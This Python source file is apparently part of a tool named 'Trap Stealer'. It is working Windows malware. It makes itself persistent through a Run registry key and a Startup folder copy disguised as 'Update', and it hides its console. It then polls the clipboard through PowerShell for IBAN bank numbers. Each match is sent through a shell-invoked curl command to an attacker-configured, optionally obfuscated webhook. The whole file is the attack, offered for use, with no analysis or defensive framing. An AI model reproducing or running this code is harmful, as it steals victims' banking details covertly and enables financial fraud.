from re import match
from subprocess import Popen, PIPE, check_output, CalledProcessError, DEVNULL
from json import dumps
from time import sleep
import os
from shutil import copy
import sys
import winreg
from os.path import isfile
import ctypes


webhook = '%WEBHOOK%' # Can be either obfuscated trap web or classic one

def add_to_startup_registry(program_path, name):
    key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_ALL_ACCESS) as reg_key:
        winreg.SetValueEx(reg_key, name, 0, winreg.REG_SZ, program_path)

def add_to_startup_folder(name):
    if getattr(sys, 'frozen', False):
        path = sys.executable
            
    else:
        path = __file__

    startuppath = os.path.join(os.getenv('appdata'), f"Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{name}.pyw")
    
    if not isfile(startuppath):
        if ".py" in path:
            copy(path, startuppath)
        elif ".pyw" in path:
            copy(path, startuppath)
        else:
            startuppath = os.path.join(os.getenv('appdata'), f"Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{name}.exe")
            copy(path, startuppath)
            
def get_program_path():
    return os.path.abspath(sys.argv[0])
    

def hide_console1():
    kernel32 = ctypes.WinDLL("kernel32.dll")
    user32 = ctypes.WinDLL("user32.dll")
    get_console_window = kernel32.GetConsoleWindow
    show_window = user32.ShowWindow
    hwnd = get_console_window()
    show_window(hwnd, 0)

def hide_console2():
    user32 = ctypes.WinDLL("user32.dll")
    get_foreground_window = user32.GetForegroundWindow
    show_window = user32.ShowWindow
    hwnd = get_foreground_window()
    show_window(hwnd, 0)
    
def DeobfuscateWeb(encrypted_text, key):
    decrypted = [0] * 256
    for i, char in enumerate(key):
        decrypted[char] = i

    decrypted_text = []
    for char in encrypted_text:
        decrypted_char = decrypted[char]
        decrypted_text.append(decrypted_char)
        
    return bytes(decrypted_text)


def is_valid_iban(text):
    iban_pattern_eu = r'^[A-Z]{2}\d{2}[A-Z0-9]{4}\d{7}([A-Z0-9]?){0,16}$'
    iban_pattern_na = r'^[A-Z]{2}\d{2}[A-Z0-9]{4}\d{5}([A-Z0-9]?){0,14}$'
    return bool(match(iban_pattern_eu, text.replace(" ", ""))) or bool(match(iban_pattern_na, text.replace(" ", "")))


def get_clipboard_content():
    try:
        clipboard_text = check_output(['powershell.exe', 'Get-Clipboard'], shell=True, text=True)
        return clipboard_text.strip()
    except CalledProcessError as e:
        return None

def send_to_web(webhookurl, text):
    if isinstance(webhook, (list, tuple)):
        webhook_url = DeobfuscateWeb(webhookurl[0],webhookurl[1]).decode()
    else:
        webhook_url = webhook
    
    data = {
        "username":"Trap Stealer",
        "avatar_url":"https://cdn3.emoji.gg/emojis/3304_astolfobean.png",
        "thumbnail": {
                    "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
                },
  "embeds": [{
    "title": f"IBAN Detected!",
    "description": f"{text}"
  }]
}

    data_json = dumps(data).replace('"', '\\"')

    curl_command = f'curl -H "Content-Type: application/json" -d "{data_json}" --insecure {webhook_url}'

    process = Popen(curl_command, shell=True, stdout=DEVNULL, stderr=DEVNULL)
    
    return True


    
if __name__ == "__main__":
    program_path = get_program_path()
    name = "Update"
    add_to_startup_registry(program_path, name)
    add_to_startup_folder(name)
    hide_console1()
    hide_console2()
    while True:
        
        sleep(1)
        clip_content = get_clipboard_content()
        if is_valid_iban(clip_content) == True:
            data = send_to_web(webhook, clip_content)

            sleep(10) if data is True else None
        else:
            pass
